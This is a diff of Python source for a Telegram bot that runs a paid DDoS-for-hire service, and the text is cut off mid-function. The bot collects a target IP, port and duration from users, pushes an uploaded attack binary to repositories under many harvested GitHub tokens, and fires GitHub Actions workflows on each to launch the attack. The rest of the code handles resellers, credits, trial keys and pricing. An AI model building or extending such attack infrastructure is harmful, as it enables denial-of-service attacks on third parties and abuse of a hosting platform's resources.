-            text += f"   ⏰ {remaining}\n\n"
+            text += f"{i}. @{data.get('username', 'Unknown')}\n   ⏰ {format_time_remaining(data['expiry_date'])}\n\n"
         
         if len(reseller_users) > 20:
-            text += f"\n... and {len(reseller_users) - 20} more"
+            text += f"... and {len(reseller_users) - 20} more"
         
-        text += f"\n📊 Total Users: {len(reseller_users)}"
+        text += f"\n📊 Total: {len(reseller_users)}"
     
-    keyboard = get_back_keyboard()
-    await query.edit_message_text(text, reply_markup=keyboard, parse_mode='Markdown')
+    await query.edit_message_text(text, reply_markup=get_back_keyboard(), parse_mode='Markdown')
 
 async def show_reseller_credits(query, user_id):
     reseller_data = resellers[str(user_id)]
-    credits = reseller_data.get('credits', 0)
-    
     text = f"""
 💳 **YOUR CREDITS**
 
-💰 Available Credits: {credits} days
-👥 Users Added: {reseller_data.get('users_added', 0)}
-📅 Member Since: {reseller_data.get('added_date', 'N/A')}
-
-💡 Use credits to add new users!
+Credits: {reseller_data.get('credits', 0)} days
+Users Added: {reseller_data.get('users_added', 0)}
 """
-    
-    keyboard = get_back_keyboard()
-    await query.edit_message_text(text, reply_markup=keyboard, parse_mode='Markdown')
+    await query.edit_message_text(text, reply_markup=get_back_keyboard(), parse_mode='Markdown')
 
 async def show_reseller_prices(query):
-    text = "💰 **RESELLER PRICE LIST**\n\n"
+    text = "💰 **RESELLER PRICES**\n\n"
+    for days, price in RESELLER_PRICES.items():
+        text += f"• {days} days: ₹{price}\n"
     
-    for days, price in USER_PRICES.items():
-        text += f"📅 {days} {'day' if days == '1' else 'days'}: ₹{price}\n"
-    
-    text += "\n💡 Contact the owner to purchase!"
-    
-    keyboard = get_back_keyboard()
-    await query.edit_message_text(text, reply_markup=keyboard, parse_mode='Markdown')
+    await query.edit_message_text(text, reply_markup=get_back_keyboard(), parse_mode='Markdown')
 
-logger.info("✅ Part 5: Action handlers loaded")
+logger.info("✅ Part 5: Action functions loaded")
+
+# Part 6: Message Handlers and Main Function
+
 async def handle_text_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
-    text = update.message.text
+    text = update.message.text.strip()
     
     if user_id not in user_states or user_states[user_id] is None:
         return
@@ -1632,80 +1323,58 @@ async def handle_text_message(update: Update, context: ContextTypes.DEFAULT_TYPE
     state_info = user_states[user_id]
     state = state_info.get("state")
     
+    # Attack flow
     if state == WAITING_FOR_IP:
-        user_states[user_id]["data"]["ip"] = text
+        user_states[user_id]["data"]["target"] = text
         user_states[user_id]["state"] = WAITING_FOR_PORT
-        await update.message.reply_text(
-            "🔌 **ENTER PORT**\n\nPlease enter the port number:",
-            reply_markup=get_cancel_keyboard()
-        )
+        await update.message.reply_text("🔌 Enter port:", reply_markup=get_cancel_keyboard())
     
     elif state == WAITING_FOR_PORT:
         try:
             port = int(text)
-            if port < 1 or port > 65535:
-                await update.message.reply_text("⚠️ Invalid port! Must be 1-65535\n\nEnter PORT:", reply_markup=get_cancel_keyboard())
-                return
-            
             user_states[user_id]["data"]["port"] = port
             user_states[user_id]["state"] = WAITING_FOR_TIME
-            await update.message.reply_text(
-                "⏱️ **ENTER DURATION**\n\nPlease enter attack duration (seconds):",
-                reply_markup=get_cancel_keyboard()
-            )
-        except ValueError:
-            await update.message.reply_text("⚠️ Invalid port number!\n\nEnter PORT:", reply_markup=get_cancel_keyboard())
+            await update.message.reply_text("⏱️ Enter duration (seconds):", reply_markup=get_cancel_keyboard())
+        except:
+            await update.message.reply_text("❌ Invalid port!", reply_markup=get_cancel_keyboard())
     
     elif state == WAITING_FOR_TIME:
         try:
             duration = int(text)
-            if duration < 10 or duration > 3600:
-                await update.message.reply_text("⚠️ Duration must be 10-3600 seconds!\n\nEnter DURATION:", reply_markup=get_cancel_keyboard())
+            if duration < 1 or duration > 300:
+                await update.message.reply_text("❌ Duration must be 1-300s!", reply_markup=get_cancel_keyboard())
                 return
             
-            target = user_states[user_id]["data"]["ip"]
-            port = user_states[user_id]["data"]["port"]
-            username = update.effective_user.username or f"user_{user_id}"
+            target = state_info["data"]["target"]
+            port = state_info["data"]["port"]
             
+            await launch_attack(update.message, user_id, target, port, duration)
             user_states[user_id] = None
-            
-            await launch_attack(target, port, duration, user_id, username, update.message)
-            
-        except ValueError:
-            await update.message.reply_text("⚠️ Invalid duration!\n\nEnter DURATION:", reply_markup=get_cancel_keyboard())
+        except:
+            await update.message.reply_text("❌ Invalid duration!", reply_markup=get_cancel_keyboard())
     
+    # User management
     elif state == WAITING_FOR_USER_ID:
         try:
-            target_user_id = int(text)
-            user_states[user_id]["data"]["target_id"] = target_user_id
+            target_id = str(int(text))
+            user_states[user_id]["data"]["target_id"] = target_id
             user_states[user_id]["state"] = WAITING_FOR_DAYS
-            await update.message.reply_text(
-                f"📅 **ENTER DAYS**\n\nHow many days of access for user {target_user_id}?",
-                reply_markup=get_cancel_keyboard()
-            )
-        except ValueError:
-            await update.message.reply_text("⚠️ Invalid User ID!\n\nEnter USER ID:", reply_markup=get_cancel_keyboard())
+            await update.message.reply_text("📅 Enter days:", reply_markup=get_cancel_keyboard())
+        except:
+            await update.message.reply_text("❌ Invalid ID!", reply_markup=get_cancel_keyboard())
     
     elif state == WAITING_FOR_DAYS:
         try:
             days = int(text)
             if days < 1:
-                await update.message.reply_text("⚠️ Days must be at least 1!\n\nEnter DAYS:", reply_markup=get_cancel_keyboard())
+                await update.message.reply_text("❌ At least 1 day!", reply_markup=get_cancel_keyboard())
                 return
             
-            action = state_info.get("action")
-            
-            if action == "approve_request":
-                target_user_id = state_info["data"]["user_id"]
-                username = state_info["data"]["username"]
-            else:
-                target_user_id = state_info["data"]["target_id"]
-                username = f"user_{target_user_id}"
-            
+            target_id = state_info["data"].get("target_id")
             expiry = datetime.now() + timedelta(days=days)
             
-            approved_users[str(target_user_id)] = {
-                "username": username,
+            approved_users[target_id] = {
+                "username": f"user_{target_id}",
                 "expiry_date": expiry.strftime("%Y-%m-%d %H:%M:%S"),
                 "added_by": str(user_id),
                 "added_date": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
@@ -1713,514 +1382,148 @@ async def handle_text_message(update: Update, context: ContextTypes.DEFAULT_TYPE
             }
             
             save_approved_users(approved_users)
-            user_states[user_id] = None
             
             await update.message.reply_text(
-                f"✅ **USER ADDED!**\n\n"
-                f"👤 User: {target_user_id}\n"
-                f"📅 Days: {days}\n"
-                f"⏰ Expires: {expiry.strftime('%Y-%m-%d %H:%M:%S')}",
-                reply_markup=get_back_keyboard()
-            )
-            
-            if action == "approve_request":
-                try:
-                    await context.bot.send_message(
-                        chat_id=target_user_id,
-                        text=f"✅ **ACCESS APPROVED!**\n\n"
-                             f"Your access request has been approved!\n"
-                             f"⏰ Valid for: {days} days\n"
-                             f"📅 Expires: {expiry.strftime('%Y-%m-%d %H:%M:%S')}\n\n"
-                             f"Use /start to begin!",
-                        parse_mode='Markdown'
-                    )
-                except:
-                    pass
-        
-        except ValueError:
-            await update.message.reply_text("⚠️ Invalid number!\n\nEnter DAYS:", reply_markup=get_cancel_keyboard())
-    
-    elif state == WAITING_FOR_REMOVE_ID:
-        try:
-            target_user_id = str(int(text))
-            
-            if target_user_id not in approved_users:
-                await update.message.reply_text("❌ User not found!", reply_markup=get_back_keyboard())
-                user_states[user_id] = None
-                return
-            
-            username = approved_users[target_user_id].get('username', 'Unknown')
-            del approved_users[target_user_id]
-            save_approved_users(approved_users)
-            
-            await update.message.reply_text(
-                f"✅ **USER REMOVED!**\n\n"
-                f"👤 User: @{username}\n"
-                f"🆔 ID: {target_user_id}",
-                reply_markup=get_back_keyboard()
-            )
-            user_states[user_id] = None
-            
-        except ValueError:
-            await update.message.reply_text("⚠️ Invalid User ID!", reply_markup=get_cancel_keyboard())
-    
-    elif state == WAITING_FOR_TOKEN:
-        token = text.strip()
-        repo_name = "soulcrack-tg"
-        
-        try:
-            for existing_token in github_tokens:
-                if existing_token['token'] == token:
-                    await update.message.reply_text("❌ Token already exists!", reply_markup=get_back_keyboard())
-                    user_states[user_id] = None
-                    return
-            
-            g = Github(token)
-            user = g.get_user()
-            username = user.login
-            
-            repo, created = create_repository(token, repo_name)
-            
-            new_token_data = {
-                'token': token,
-                'username': username,
-                'repo': f"{username}/{repo_name}",
-                'added_date': time.strftime("%Y-%m-%d %H:%M:%S"),
-                'status': 'active'
-            }
-            
-            github_tokens.append(new_token_data)
-            save_github_tokens(github_tokens)
-            
-            status = "NEW REPO CREATED" if created else "EXISTING REPO USED"
-            
-            await update.message.reply_text(
-                f"✅ **{status} & TOKEN ADDED!**\n\n"
-                f"👤 Username: {username}\n"
-                f"📁 Repo: {repo_name}\n"
-                f"📊 Total servers: {len(github_tokens)}",
-                reply_markup=get_back_keyboard()
-            )
-            user_states[user_id] = None
-            
-        except Exception as e:
-            await update.message.reply_text(
-                f"❌ **ERROR**\n\n{str(e)}\n\nPlease check the token.",
-                reply_markup=get_back_keyboard()
-            )
-            user_states[user_id] = None
-    
-    elif state == "select_server_remove":
-        try:
-            server_num = int(text)
-            if server_num < 1 or server_num > len(github_tokens):
-                await update.message.reply_text(f"❌ Invalid number! Use 1-{len(github_tokens)}", reply_markup=get_cancel_keyboard())
-                return
-            
-            removed_token = github_tokens.pop(server_num - 1)
-            save_github_tokens(github_tokens)
-            
-            await update.message.reply_text(
-                f"✅ **SERVER REMOVED!**\n\n"
-                f"👤 Server: {removed_token['username']}\n"
-                f"📁 Repo: {removed_token['repo']}\n"
-                f"📊 Remaining: {len(github_tokens)}",
-                reply_markup=get_back_keyboard()
-            )
-            user_states[user_id] = None
-            
-        except ValueError:
-            await update.message.reply_text("⚠️ Invalid number!", reply_markup=get_cancel_keyboard())
-    
-    elif state == WAITING_FOR_COOLDOWN:
-        try:
-            global COOLDOWN_DURATION
-            new_cooldown = int(text)
-            if new_cooldown < 10:
-                await update.message.reply_text("⚠️ Minimum cooldown is 10 seconds!\n\nEnter COOLDOWN:", reply_markup=get_cancel_keyboard())
-                return
-            
-            COOLDOWN_DURATION = new_cooldown
-            save_cooldown(new_cooldown)
-            
-            await update.message.reply_text(
-                f"✅ **COOLDOWN UPDATED!**\n\n"
-                f"New cooldown: {COOLDOWN_DURATION}s",
-                reply_markup=get_back_keyboard()
-            )
-            user_states[user_id] = None
-        except ValueError:
-            await update.message.reply_text("⚠️ Invalid number!\n\nEnter COOLDOWN:", reply_markup=get_cancel_keyboard())
-    
-    elif state == WAITING_FOR_MAX_ATTACKS:
-        try:
-            global MAX_ATTACKS
-            max_attacks = int(text)
-            if max_attacks < 1 or max_attacks > 1000:
-                await update.message.reply_text("⚠️ Must be 1-1000!\n\nEnter MAX ATTACKS:", reply_markup=get_cancel_keyboard())
-                return
-            
-            MAX_ATTACKS = max_attacks
-            save_max_attacks(max_attacks)
-            
-            await update.message.reply_text(
-                f"✅ **MAX ATTACKS UPDATED!**\n\n"
-                f"New limit: {MAX_ATTACKS}",
-                reply_markup=get_back_keyboard()
-            )
-            user_states[user_id] = None
-        except ValueError:
-            await update.message.reply_text("⚠️ Invalid number!\n\nEnter MAX ATTACKS:", reply_markup=get_cancel_keyboard())
-    
-    elif state == WAITING_FOR_TRIAL_HOURS:
-        try:
-            hours = int(text)
-            if hours < 1 or hours > 720:
-                await update.message.reply_text("⚠️ Hours must be 1-720!\n\nEnter HOURS:", reply_markup=get_cancel_keyboard())
-                return
-            
-            key = generate_trial_key(hours)
-            
-            await update.message.reply_text(
-                f"✅ **TRIAL KEY GENERATED!**\n\n"
-                f"🎁 Key: `{key}`\n"
-                f"⏱️ Duration: {hours} hours\n\n"
-                f"Share this key with users to give them trial access!",
+                f"✅ **USER ADDED**\n\n🆔 {target_id}\n📅 {days} days",
                 reply_markup=get_back_keyboard(),
                 parse_mode='Markdown'
             )
             user_states[user_id] = None
+        except:
+            await update.message.reply_text("❌ Invalid!", reply_markup=get_cancel_keyboard())
+    
+    elif state == WAITING_FOR_REMOVE_ID:
+        try:
+            target_id = str(int(text))
+            if target_id in approved_users:
+                del approved_users[target_id]
+                save_approved_users(approved_users)
+                await update.message.reply_text(
+                    f"✅ **REMOVED**\n\n🆔 {target_id}",
+                    reply_markup=get_back_keyboard(),
+                    parse_mode='Markdown'
+                )
+            else:
+                await update.message.reply_text("❌ Not found!", reply_markup=get_back_keyboard())
+            user_states[user_id] = None
+        except:
+            await update.message.reply_text("❌ Invalid ID!", reply_markup=get_cancel_keyboard())
+    
+    # Settings
+    elif state == WAITING_FOR_COOLDOWN:
+        try:
+            global COOLDOWN_DURATION
+            cooldown = int(text)
+            if cooldown < 10 or cooldown > 300:
+                await update.message.reply_text("❌ Must be 10-300s!", reply_markup=get_cancel_keyboard())
+                return
             
-        except ValueError:
-            await update.message.reply_text("⚠️ Invalid number!\n\nEnter HOURS:", reply_markup=get_cancel_keyboard())
+            COOLDOWN_DURATION = cooldown
+            save_cooldown(cooldown)
+            await update.message.reply_text(
+                f"✅ **COOLDOWN SET**\n\n⏱️ {cooldown}s",
+                reply_markup=get_back_keyboard(),
+                parse_mode='Markdown'
+            )
+            user_states[user_id] = None
+        except:
+            await update.message.reply_text("❌ Invalid!", reply_markup=get_cancel_keyboard())
     
-    elif state == WAITING_FOR_REDEEM_KEY:
-        key = text.upper()
-        
-        if key not in trial_keys:
-            await update.message.reply_text("❌ Invalid trial key!", reply_markup=get_back_keyboard())
+    elif state == WAITING_FOR_MAX_ATTACKS:
+        try:
+            global MAX_ATTACKS
+            max_att = int(text)
+            if max_att < 1 or max_att > 100:
+                await update.message.reply_text("❌ Must be 1-100!", reply_markup=get_cancel_keyboard())
+                return
+            
+            MAX_ATTACKS = max_att
+            save_max_attacks(max_att)
+            await update.message.reply_text(
+                f"✅ **MAX ATTACKS SET**\n\n🎯 {max_att}",
+                reply_markup=get_back_keyboard(),
+                parse_mode='Markdown'
+            )
             user_states[user_id] = None
-            return
-        
-        key_data = trial_keys[key]
-        
-        if key_data.get('used'):
-            await update.message.reply_text("❌ This key has already been used!", reply_markup=get_back_keyboard())
-            user_states[user_id] = None
-            return
-        
-        expiry = datetime.strptime(key_data['expiry'], "%Y-%m-%d %H:%M:%S")
-        if datetime.now() > expiry:
-            await update.message.reply_text("❌ This key has expired!", reply_markup=get_back_keyboard())
-            user_states[user_id] = None
-            return
-        
-        hours = key_data['hours']
-        new_expiry = datetime.now() + timedelta(hours=hours)
-        
-        approved_users[str(user_id)] = {
-            "username": update.effective_user.username or f"user_{user_id}",
-            "expiry_date": new_expiry.strftime("%Y-%m-%d %H:%M:%S"),
-            "added_by": "trial_key",
-            "added_date": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
-            "plan": f"{hours}h trial"
-        }
-        
-        trial_keys[key]['used'] = True
-        trial_keys[key]['used_by'] = user_id
-        trial_keys[key]['used_date'] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-        
-        save_approved_users(approved_users)
-        save_trial_keys(trial_keys)
-        
-        await update.message.reply_text(
-            f"✅ **TRIAL KEY ACTIVATED!**\n\n"
-            f"🎁 Duration: {hours} hours\n"
-            f"⏰ Valid Until: {new_expiry.strftime('%Y-%m-%d %H:%M:%S')}\n\n"
-            f"You now have access! Use /start to begin.",
-            reply_markup=get_back_keyboard()
-        )
-        user_states[user_id] = None
+        except:
+            await update.message.reply_text("❌ Invalid!", reply_markup=get_cancel_keyboard())
     
+    # Trial key generation
+    elif state == WAITING_FOR_TRIAL_HOURS:
+        try:
+            hours = int(text)
+            if hours < 1 or hours > 168:
+                await update.message.reply_text("❌ Must be 1-168 hours!", reply_markup=get_cancel_keyboard())
+                return
+            
+            key = ''.join(random.choices(string.ascii_uppercase + string.digits, k=16))
+            trial_keys[key] = {
+                "hours": hours,
+                "generated_by": user_id,
+                "generated_date": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
+                "used": False
+            }
+            save_trial_keys(trial_keys)
+            
+            await update.message.reply_text(
+                f"✅ **KEY GENERATED**\n\n🎁 Key: `{key}`\n⏰ {hours}h",
+                reply_markup=get_back_keyboard(),
+                parse_mode='Markdown'
+            )
+            user_states[user_id] = None
+        except:
+            await update.message.reply_text("❌ Invalid!", reply_markup=get_cancel_keyboard())
+    
+    # Broadcast
     elif state == WAITING_FOR_BROADCAST:
-        if not is_owner(user_id):
-            return
-        
-        broadcast_text = text
         success = 0
         failed = 0
         
         for target_id in approved_users.keys():
             try:
-                await context.bot.send_message(
-                    chat_id=int(target_id),
-                    text=f"📢 **BROADCAST MESSAGE**\n\n{broadcast_text}",
-                    parse_mode='Markdown'
-                )
+                await context.bot.send_message(chat_id=int(target_id), text=text)
                 success += 1
             except:
                 failed += 1
         
         await update.message.reply_text(
-            f"✅ **BROADCAST COMPLETED!**\n\n"
-            f"✅ Sent: {success}\n"
-            f"❌ Failed: {failed}\n"
-            f"📊 Total: {len(approved_users)}",
-            reply_markup=get_back_keyboard()
+            f"✅ **BROADCAST SENT**\n\n✅ {success}\n❌ {failed}",
+            reply_markup=get_back_keyboard(),
+            parse_mode='Markdown'
         )
         user_states[user_id] = None
     
-    elif state == "add_admin_id":
+    # Token management
+    elif state == WAITING_FOR_TOKEN:
+        token = text
         try:
-            admin_id = str(int(text))
+            g = Github(token)
+            user = g.get_user()
+            username = user.login
+            repo_name = "attack-server"
             
-            if admin_id in admins:
-                await update.message.reply_text("⚠️ Already an admin!", reply_markup=get_back_keyboard())
-                user_states[user_id] = None
-                return
+            try:
+                repo = g.get_user().get_repo(repo_name)
+            except:
+                repo = g.get_user().create_repo(repo_name)
             
-            admins[admin_id] = {
-                "username": f"admin_{admin_id}",
-                "added_by": str(user_id),
-                "added_date": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-            }
-            
-            save_admins(admins)
-            
-            await update.message.reply_text(
-                f"✅ **ADMIN ADDED!**\n\n"
-                f"🆔 ID: {admin_id}",
-                reply_markup=get_back_keyboard()
-            )
-            user_states[user_id] = None
-            
-        except ValueError:
-            await update.message.reply_text("⚠️ Invalid ID!", reply_markup=get_cancel_keyboard())
-    
-    elif state == "remove_admin_id":
-        try:
-            admin_id = str(int(text))
-            
-            if admin_id not in admins:
-                await update.message.reply_text("❌ Admin not found!", reply_markup=get_back_keyboard())
-                user_states[user_id] = None
-                return
-            
-            del admins[admin_id]
-            save_admins(admins)
-            
-            await update.message.reply_text(
-                f"✅ **ADMIN REMOVED!**\n\n"
-                f"🆔 ID: {admin_id}",
-                reply_markup=get_back_keyboard()
-            )
-            user_states[user_id] = None
-            
-        except ValueError:
-            await update.message.reply_text("⚠️ Invalid ID!", reply_markup=get_cancel_keyboard())
-    
-    elif state == "add_reseller_id":
-        try:
-            reseller_id = str(int(text))
-            
-            if reseller_id in resellers:
-                await update.message.reply_text("⚠️ Already a reseller!", reply_markup=get_back_keyboard())
-                user_states[user_id] = None
-                return
-            
-            user_states[user_id]["data"]["reseller_id"] = reseller_id
-            user_states[user_id]["state"] = "add_reseller_credits"
-            
-            await update.message.reply_text(
-                "💳 **ENTER CREDITS**\n\nHow many days of credits?",
-                reply_markup=get_cancel_keyboard()
-            )
-            
-        except ValueError:
-            await update.message.reply_text("⚠️ Invalid ID!", reply_markup=get_cancel_keyboard())
-    
-    elif state == "add_reseller_credits":
-        try:
-            credits = int(text)
-            if credits < 1:
-                await update.message.reply_text("⚠️ Credits must be at least 1!", reply_markup=get_cancel_keyboard())
-                return
-            
-            reseller_id = state_info["data"]["reseller_id"]
-            
-            resellers[reseller_id] = {
-                "username": f"reseller_{reseller_id}",
-                "credits": credits,
-                "added_by": str(user_id),
+            github_tokens.append({
+                "token": token,
+                "username": username,
+                "repo": f"{username}/{repo_name}",
                 "added_date": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
-                "users_added": 0
-            }
-            
-            save_resellers(resellers)
+                "status": "active"
+            })
+            save_github_tokens(github_tokens)
             
             await update.message.reply_text(
-                f"✅ **RESELLER ADDED!**\n\n"
-                f"🆔 ID: {reseller_id}\n"
-                f"💳 Credits: {credits} days",
-                reply_markup=get_back_keyboard()
+                f"✅ **SERVER ADDED**\n\n👤 {username}\n📊 Total: {len(github_tokens)}",
+                reply_markup=get_back_keyboard(),
+                parse_mode='Markdown'
             )
             user_states[user_id] = None
-            
-        except ValueError:
-            await update.message.reply_text("⚠️ Invalid number!", reply_markup=get_cancel_keyboard())
-    
-    elif state == "remove_reseller_id":
-        try:
-            reseller_id = str(int(text))
-            
-            if reseller_id not in resellers:
-                await update.message.reply_text("❌ Reseller not found!", reply_markup=get_back_keyboard())
-                user_states[user_id] = None
-                return
-            
-            del resellers[reseller_id]
-            save_resellers(resellers)
-            
-            await update.message.reply_text(
-                f"✅ **RESELLER REMOVED!**\n\n"
-                f"🆔 ID: {reseller_id}",
-                reply_markup=get_back_keyboard()
-            )
-            user_states[user_id] = None
-            
-        except ValueError:
-            await update.message.reply_text("⚠️ Invalid ID!", reply_markup=get_cancel_keyboard())
-    
-    elif state == "add_credits_id":
-        try:
-            reseller_id = str(int(text))
-            
-            if reseller_id not in resellers:
-                await update.message.reply_text("❌ Reseller not found!", reply_markup=get_back_keyboard())
-                user_states[user_id] = None
-                return
-            
-            user_states[user_id]["data"]["reseller_id"] = reseller_id
-            user_states[user_id]["state"] = "add_credits_amount"
-            
-            await update.message.reply_text(
-                f"💳 **ADD CREDITS**\n\nCurrent: {resellers[reseller_id].get('credits', 0)} days\n\nHow many days to add?",
-                reply_markup=get_cancel_keyboard()
-            )
-            
-        except ValueError:
-            await update.message.reply_text("⚠️ Invalid ID!", reply_markup=get_cancel_keyboard())
-    
-    elif state == "add_credits_amount":
-        try:
-            credits = int(text)
-            if credits < 1:
-                await update.message.reply_text("⚠️ Credits must be at least 1!", reply_markup=get_cancel_keyboard())
-                return
-            
-            reseller_id = state_info["data"]["reseller_id"]
-            resellers[reseller_id]["credits"] = resellers[reseller_id].get("credits", 0) + credits
-            save_resellers(resellers)
-            
-            await update.message.reply_text(
-                f"✅ **CREDITS ADDED!**\n\n"
-                f"🆔 Reseller: {reseller_id}\n"
-                f"➕ Added: {credits} days\n"
-                f"💳 New Total: {resellers[reseller_id]['credits']} days",
-                reply_markup=get_back_keyboard()
-            )
-            user_states[user_id] = None
-            
-        except ValueError:
-            await update.message.reply_text("⚠️ Invalid number!", reply_markup=get_cancel_keyboard())
-    
-    elif state == "reseller_add_user_id":
-        try:
-            target_user_id = str(int(text))
-            user_states[user_id]["data"]["target_id"] = target_user_id
-            user_states[user_id]["state"] = "reseller_add_user_days"
-            
-            await update.message.reply_text(
-                "📅 **ENTER DAYS**\n\nHow many days of access?",
-                reply_markup=get_cancel_keyboard()
-            )
-            
-        except ValueError:
-            await update.message.reply_text("⚠️ Invalid ID!", reply_markup=get_cancel_keyboard())
-    
-    elif state == "reseller_add_user_days":
-        try:
-            days = int(text)
-            if days < 1:
-                await update.message.reply_text("⚠️ Days must be at least 1!", reply_markup=get_cancel_keyboard())
-                return
-            
-            reseller_data = resellers[str(user_id)]
-            if reseller_data.get('credits', 0) < days:
-                await update.message.reply_text(
-                    f"❌ **INSUFFICIENT CREDITS!**\n\n"
-                    f"You have: {reseller_data.get('credits', 0)} days\n"
-                    f"Required: {days} days",
-                    reply_markup=get_back_keyboard()
-                )
-                user_states[user_id] = None
-                return
-            
-            target_user_id = state_info["data"]["target_id"]
-            expiry = datetime.now() + timedelta(days=days)
-            
-            approved_users[target_user_id] = {
-                "username": f"user_{target_user_id}",
-                "expiry_date": expiry.strftime("%Y-%m-%d %H:%M:%S"),
-                "added_by": str(user_id),
-                "added_date": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
-                "plan": f"{days} days"
-            }
-            
-            resellers[str(user_id)]["credits"] -= days
-            resellers[str(user_id)]["users_added"] = resellers[str(user_id)].get("users_added", 0) + 1
-            
-            save_approved_users(approved_users)
-            save_resellers(resellers)
-            
-            await update.message.reply_text(
-                f"✅ **USER ADDED!**\n\n"
-                f"👤 User: {target_user_id}\n"
-                f"📅 Days: {days}\n"
-                f"💳 Credits Left: {resellers[str(user_id)]['credits']} days",
-                reply_markup=get_back_keyboard()
-            )
-            user_states[user_id] = None
-            
-        except ValueError:
-            await update.message.reply_text("⚠️ Invalid number!", reply_markup=get_cancel_keyboard())
-    
-    elif state == "reseller_remove_user_id":
-        try:
-            target_user_id = str(int(text))
-            
-            if target_user_id not in approved_users:
-                await update.message.reply_text("❌ User not found!", reply_markup=get_back_keyboard())
-                user_states[user_id] = None
-                return
-            
-            if approved_users[target_user_id].get('added_by') != str(user_id):
-                await update.message.reply_text("❌ You can only remove users you added!", reply_markup=get_back_keyboard())
-                user_states[user_id] = None
-                return
-            
-            del approved_users[target_user_id]
-            save_approved_users(approved_users)
-            
-            await update.message.reply_text(
-                f"✅ **USER REMOVED!**\n\n"
-                f"🆔 ID: {target_user_id}",
-                reply_markup=get_back_keyboard()
-            )
-            user_states[user_id] = None
-            
-        except ValueError:
-            await update.message.reply_text("⚠️ Invalid ID!", reply_markup=get_cancel_keyboard())
+        except Exception as e:
+            await update.message.reply_text(f"❌ Error: {str(e)}", reply_markup=get_cancel_keyboard())
 
 async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
@@ -2229,92 +1532,127 @@ async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
     
     state_info = user_states[user_id]
-    state = state_info.get("state")
+    if state_info.get("state") != WAITING_FOR_BINARY:
+        return
     
-    if state == WAITING_FOR_BINARY:
-        if not is_owner(user_id):
-            await update.message.reply_text("⚠️ ACCESS DENIED")
-            user_states[user_id] = None
-            return
+    if not is_owner(user_id):
+        await update.message.reply_text("❌ ACCESS DENIED")
+        return
+    
+    progress_msg = await update.message.reply_text("📥 Downloading...")
+    
+    try:
+        file = await update.message.document.get_file()
+        file_path = f"temp_binary_{user_id}.bin"
+        await file.download_to_drive(file_path)
         
-        progress_msg = await update.message.reply_text("📥 Downloading binary file...")
+        with open(file_path, 'rb') as f:
+            binary_content = f.read()
         
-        try:
-            file = await update.message.document.get_file()
-            file_path = f"temp_binary_{user_id}.bin"
-            await file.download_to_drive(file_path)
-            
-            with open(file_path, 'rb') as f:
-                binary_content = f.read()
-            
-            file_size = len(binary_content)
-            
-            await progress_msg.edit_text(
-                f"📊 Downloaded: {file_size} bytes\n\n"
-                f"📤 Uploading to {len(github_tokens)} servers..."
-            )
-            
-            success_count = 0
-            results = []
-            
-            def upload_to_repo(token_data):
+        file_size = len(binary_content)
+        await progress_msg.edit_text(f"📤 Uploading to {len(github_tokens)} servers...")
+        
+        success = 0
+        
+        def upload_to_repo(token_data):
+            try:
+                g = Github(token_data['token'])
+                repo = g.get_repo(token_data['repo'])
+                
                 try:
-                    g = Github(token_data['token'])
-                    repo = g.get_repo(token_data['repo'])
-                    
-                    try:
-                        existing_file = repo.get_contents(BINARY_FILE_NAME)
-                        repo.update_file(
-                            BINARY_FILE_NAME,
-                            "Update binary file",
-                            binary_content,
-                            existing_file.sha,
-                            branch="main"
-                        )
-                        results.append((token_data['username'], True))
-                    except:
-                        repo.create_file(
-                            BINARY_FILE_NAME,
-                            "Upload binary file",
-                            binary_content,
-                            branch="main"
-                        )
-                        results.append((token_data['username'], True))
-                except Exception as e:
-                    results.append((token_data['username'], False))
-            
-            threads = []
-            for token_data in github_tokens:
-                thread = threading.Thread(target=upload_to_repo, args=(token_data,))
-                threads.append(thread)
-                thread.start()
-            
-            for thread in threads:
-                thread.join()
-            
-            for username, success in results:
-                if success:
-                    success_count += 1
-            
-            os.remove(file_path)
-            
-            await progress_msg.edit_text(
-                f"✅ **UPLOAD COMPLETED!**\n\n"
-                f"✅ Successful: {success_count}\n"
-                f"❌ Failed: {len(github_tokens) - success_count}\n"
-                f"📊 Total: {len(github_tokens)}\n\n"
-                f"📁 File: {BINARY_FILE_NAME}\n"
-                f"📦 Size: {file_size} bytes",
-                reply_markup=get_back_keyboard()
+                    existing = repo.get_contents(BINARY_FILE_NAME)
+                    repo.update_file(BINARY_FILE_NAME, "Update binary", binary_content, existing.sha, branch="main")
+                except:
+                    repo.create_file(BINARY_FILE_NAME, "Upload binary", binary_content, branch="main")
+                return True
+            except:
+                return False
+        
+        threads = []
+        results = []
+        
+        def thread_upload(token_data):
+            results.append(upload_to_repo(token_data))
+        
+        for token_data in github_tokens:
+            t = threading.Thread(target=thread_upload, args=(token_data,))
+            threads.append(t)
+            t.start()
+        
+        for t in threads:
+            t.join()
+        
+        success = sum(results)
+        os.remove(file_path)
+        
+        await progress_msg.edit_text(
+            f"✅ **UPLOAD DONE**\n\n✅ {success}\n❌ {len(github_tokens) - success}\n📦 {file_size} bytes",
+            reply_markup=get_back_keyboard(),
+            parse_mode='Markdown'
+        )
+        user_states[user_id] = None
+    except Exception as e:
+        await progress_msg.edit_text(f"❌ Error: {str(e)}", reply_markup=get_back_keyboard())
+        user_states[user_id] = None
+
+async def launch_attack(message, user_id, target, port, duration):
+    global current_attack, cooldown_until
+    
+    if not github_tokens:
+        await message.reply_text("❌ No servers!", reply_markup=get_back_keyboard())
+        return
+    
+    progress = await message.reply_text("🚀 Launching attack...")
+    
+    current_attack = {
+        "target": target,
+        "port": port,
+        "duration": duration,
+        "user_id": user_id,
+        "start_time": time.time()
+    }
+    save_attack_state()
+    
+    if user_id not in user_attack_counts:
+        user_attack_counts[user_id] = 0
+    user_attack_counts[user_id] += 1
+    
+    def run_attack(token_data):
+        try:
+            g = Github(token_data['token'])
+            repo = g.get_repo(token_data['repo'])
+            workflow = repo.get_workflow("main.yml")
+            workflow.create_dispatch(
+                ref="main",
+                inputs={"target": target, "port": str(port), "time": str(duration)}
             )
-            user_states[user_id] = None
-            
-        except Exception as e:
-            await progress_msg.edit_text(
-                f"❌ **ERROR**\n\n{str(e)}",
